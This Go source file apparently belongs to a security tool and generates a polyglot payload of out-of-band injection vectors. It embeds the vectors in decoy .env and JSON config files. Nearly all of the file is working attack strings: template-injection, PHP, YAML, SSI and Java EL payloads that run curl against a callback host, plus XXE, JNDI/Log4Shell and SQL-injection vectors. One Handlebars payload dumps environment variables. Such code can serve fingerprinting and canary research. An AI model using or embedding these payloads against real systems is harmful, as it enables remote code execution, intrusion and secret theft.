package payloads

import (
	"fmt"
	"strings"
)

// TechProbe is a single test vector targeting a specific parser/technology.
type TechProbe struct {
	Tech     string // Technology name
	Vector   string // The payload string
	Callback string // Unique callback URL for this tech
}

// PolyPayload generates a polyglot payload that fingerprints the target's
// technology stack. Each embedded vector has a unique callback URL.
// When a callback fires, we know which parser processed the content.
//
// The base callback URL should be: https://CANARY.oob.yourdomain.com/tech/
// Each tech gets its own path: /tech/html, /tech/jinja2, /tech/php, etc.
func PolyPayload(baseCallback string, canary string) (string, []TechProbe) {
	cb := func(tech string) string {
		return fmt.Sprintf("%s/%s?c=%s", baseCallback, tech, canary[:16])
	}

	probes := []TechProbe{
		// HTML/Browser rendering
		{Tech: "html_img", Callback: cb("html_img"),
			Vector: fmt.Sprintf(`<img src="%s" style="display:none">`, cb("html_img"))},
		{Tech: "html_script", Callback: cb("html_script"),
			Vector: fmt.Sprintf(`<script>new Image().src="%s"</script>`, cb("html_script"))},
		{Tech: "html_link", Callback: cb("html_link"),
			Vector: fmt.Sprintf(`<link rel="stylesheet" href="%s">`, cb("html_link"))},

		// Server-Side Template Injection (SSTI)
		{Tech: "jinja2", Callback: cb("jinja2"),
			Vector: fmt.Sprintf(`{{config.__class__.__init__.__globals__['os'].popen('curl %s').read()}}`, cb("jinja2"))},
		{Tech: "jinja2_simple", Callback: cb("jinja2_simple"),
			Vector: `{{7*'7'}}`}, // Returns 7777777 in Jinja2
		{Tech: "twig", Callback: cb("twig"),
			Vector: `{{_self.env.display("7*7")}}`},
		{Tech: "erb", Callback: cb("erb"),
			Vector: fmt.Sprintf(`<%%=` + "`curl %s`" + `%%>`, cb("erb"))},
		{Tech: "freemarker", Callback: cb("freemarker"),
			Vector: fmt.Sprintf(`${"freemarker.template.utility.Execute"?new()("curl %s")}`, cb("freemarker"))},
		{Tech: "velocity", Callback: cb("velocity"),
			Vector: fmt.Sprintf(`#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getMethod('exec',$x.class.forName('java.lang.String')))$ex.invoke($rt.getMethod('getRuntime').invoke(null),'curl %s')`, cb("velocity"))},
		{Tech: "handlebars", Callback: cb("handlebars"),
			Vector: `{{#with "s" as |string|}}{{{string.sub "constructor" 0 0 "return JSON.stringify(process.env)"}}}{{/with}}`},
		{Tech: "mako", Callback: cb("mako"),
			Vector: fmt.Sprintf(`${__import__("os").popen("curl %s").read()}`, cb("mako"))},
		{Tech: "smarty", Callback: cb("smarty"),
			Vector: fmt.Sprintf(`{system("curl %s")}`, cb("smarty"))},

		// PHP
		{Tech: "php_short", Callback: cb("php_short"),
			Vector: fmt.Sprintf(`<?=shell_exec("curl %s")?>`, cb("php_short"))},
		{Tech: "php_full", Callback: cb("php_full"),
			Vector: fmt.Sprintf(`<?php file_get_contents("%s");?>`, cb("php_full"))},

		// XXE (XML External Entity)
		{Tech: "xxe_file", Callback: cb("xxe"),
			Vector: fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]><foo>&xxe;</foo>`, cb("xxe"))},
		{Tech: "xxe_param", Callback: cb("xxe_param"),
			Vector: fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %%xxe SYSTEM "%s">%%xxe;]>`, cb("xxe_param"))},

		// YAML deserialization
		{Tech: "yaml_load", Callback: cb("yaml_load"),
			Vector: fmt.Sprintf(`!!python/object/apply:os.system ["curl %s"]`, cb("yaml_load"))},

		// Server-Side Includes (SSI)
		{Tech: "ssi", Callback: cb("ssi"),
			Vector: fmt.Sprintf(`<!--#exec cmd="curl %s" -->`, cb("ssi"))},

		// Expression Language (Java EL)
		{Tech: "java_el", Callback: cb("java_el"),
			Vector: fmt.Sprintf(`${Runtime.getRuntime().exec("curl %s")}`, cb("java_el"))},

		// XSLT
		{Tech: "xslt", Callback: cb("xslt"),
			Vector: fmt.Sprintf(`<xsl:value-of select="document('%s')"/>`, cb("xslt"))},

		// Log4Shell style (JNDI)
		{Tech: "jndi", Callback: cb("jndi"),
			Vector: fmt.Sprintf(`${jndi:ldap://%s/a}`, cb("jndi"))},

		// SQL Injection (blind, causes DNS lookup)
		{Tech: "sqli_mssql", Callback: cb("sqli_mssql"),
			Vector: fmt.Sprintf(`'; EXEC master..xp_dirtree '\\%s\a' --`, strings.TrimPrefix(cb("sqli_mssql"), "https://"))},
		{Tech: "sqli_postgres", Callback: cb("sqli_postgres"),
			Vector: fmt.Sprintf(`'; COPY (SELECT '') TO PROGRAM 'curl %s' --`, cb("sqli_postgres"))},
		{Tech: "sqli_oracle", Callback: cb("sqli_oracle"),
			Vector: fmt.Sprintf(`'||(SELECT UTL_HTTP.REQUEST('%s') FROM DUAL)||'`, cb("sqli_oracle"))},

		// LDAP Injection
		{Tech: "ldap", Callback: cb("ldap"),
			Vector: fmt.Sprintf(`*)(objectClass=*))%%00`),
		},

		// Header injection / CRLF
		{Tech: "crlf", Callback: cb("crlf"),
			Vector: fmt.Sprintf("X-Injected: true\r\nLocation: %s", cb("crlf"))},
	}

	return buildPolyglot(probes), probes
}

// buildPolyglot combines all vectors into a single multi-format payload.
func buildPolyglot(probes []TechProbe) string {
	var b strings.Builder

	// Start with XML prolog (for XXE parsers)
	b.WriteString("<?xml version=\"1.0\"?>\n")

	// HTML comment wrapper (hides XML from HTML parsers)
	b.WriteString("<!--\n")
	for _, p := range probes {
		if p.Tech == "xxe_file" || p.Tech == "xxe_param" {
			b.WriteString(p.Vector + "\n")
		}
	}
	b.WriteString("-->\n")

	// Template injection markers (one per line, as "comments")
	b.WriteString("# Config file\n")
	b.WriteString("# Version: 2.1.0\n\n")

	for _, p := range probes {
		switch {
		case strings.HasPrefix(p.Tech, "jinja"), strings.HasPrefix(p.Tech, "twig"),
			strings.HasPrefix(p.Tech, "freemarker"), strings.HasPrefix(p.Tech, "velocity"),
			strings.HasPrefix(p.Tech, "handlebars"), strings.HasPrefix(p.Tech, "mako"),
			strings.HasPrefix(p.Tech, "smarty"):
			b.WriteString(fmt.Sprintf("# %s: %s\n", p.Tech, p.Vector))
		}
	}

	b.WriteString("\n")

	// Key-value section (looks like config, triggers template engines)
	b.WriteString("APP_ENV=production\n")
	for _, p := range probes {
		if strings.HasPrefix(p.Tech, "jinja2_simple") {
			b.WriteString(fmt.Sprintf("APP_VERSION=%s\n", p.Vector))
		}
	}
	b.WriteString("\n")

	// PHP section
	for _, p := range probes {
		if strings.HasPrefix(p.Tech, "php") {
			b.WriteString(p.Vector + "\n")
		}
	}

	// SSI section
	for _, p := range probes {
		if p.Tech == "ssi" {
			b.WriteString(p.Vector + "\n")
		}
	}

	// YAML section
	b.WriteString("\n---\n")
	for _, p := range probes {
		if p.Tech == "yaml_load" {
			b.WriteString(p.Vector + "\n")
		}
	}

	// HTML section (at the end, for browser rendering)
	b.WriteString("\n<!-- HTML -->\n")
	for _, p := range probes {
		if strings.HasPrefix(p.Tech, "html") {
			b.WriteString(p.Vector + "\n")
		}
	}

	// JNDI / Java EL / Log4Shell
	b.WriteString("\n# Java\n")
	for _, p := range probes {
		if p.Tech == "jndi" || p.Tech == "java_el" {
			b.WriteString(fmt.Sprintf("# %s\n", p.Vector))
		}
	}

	return b.String()
}

// EnvPayload generates a .env-style payload with embedded tech probes.
func EnvPayload(baseCallback, canary, domain string) string {
	poly, _ := PolyPayload(baseCallback, canary)
	return fmt.Sprintf(`# .env — %s
APP_NAME=%s
APP_KEY=%s
DB_PASSWORD={{config.items()}}
API_SECRET=${7*7}
STRIPE_KEY=<%%= 7*7 %%>

%s
`, domain, canary[:16], canary[:32], poly)
}

// ConfigJSONPayload generates a JSON config with embedded tracking.
func ConfigJSONPayload(baseCallback, canary string) string {
	return fmt.Sprintf(`{
  "version": "2.1.0",
  "api_key": "%s",
  "debug": "{{7*7}}",
  "template": "${7*7}",
  "erb_test": "<%%= 7*7 %%>",
  "callback": "%s",
  "jndi": "${jndi:ldap://%s/tech/jndi?c=%s}",
  "_canary": "%s"
}`, canary[:16], baseCallback+"/json_fetch", strings.TrimPrefix(baseCallback, "https://")+"/jndi", canary[:8], canary)
}
